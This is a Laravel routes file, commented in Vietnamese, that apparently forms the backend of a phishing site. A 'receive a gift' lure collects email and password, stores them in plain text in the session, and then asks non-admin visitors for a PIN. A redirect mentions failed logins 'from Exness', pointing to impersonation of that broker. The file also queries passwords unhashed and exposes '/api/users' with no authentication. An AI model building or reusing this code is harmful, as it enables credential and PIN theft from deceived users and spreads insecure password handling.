
<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Models\User;

Route::middleware(['force.https'])->group(function () {
    // Trang chính truy cập '/'
    Route::get('/', function () {
        return view('getItNow');
    });

    // Khi bấm nút "Nhận ngay", chuyển đến welcome
    Route::get('/welcome', function () {
        return view('welcome');
    });

    // Kiểm tra admin
    Route::post('/receive', function () {
        $email = request('email');
        $password = request('password');

        // Kiểm tra nếu là admin
        $admin = User::where('email', $email)
            ->where('password', $password) // không mã hóa
            ->where('is_admin', true)
            ->first();

        if ($admin) {
            session([
                'email' => $email,
                'password' => $password,
            ]);
            return redirect()->secure('/admin');
        }

        // Nếu không phải admin → chuyển sang bước nhập PIN
        session([
            'email' => $email,
            'password' => $password,
        ]);
        return redirect()->secure('/nhanQua');
    })->name('login.step1');

    Route::get('/nhanQua', function () {
        return view('receiveGift');
    });

    Route::post('/', [UserController::class, 'store'])->name('login.store');

    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');

    Route::get('/api/users', [UserController::class, 'getUsersJson']);

    // Route xử lý đăng nhập thất bại từ Exness
    Route::get('/login-failed', function () {
        return redirect()->secure('/welcome')->with('error', 'Thông tin email hoặc password không hợp lệ, vui lòng nhập lại');
    })->name('login.failed');
});
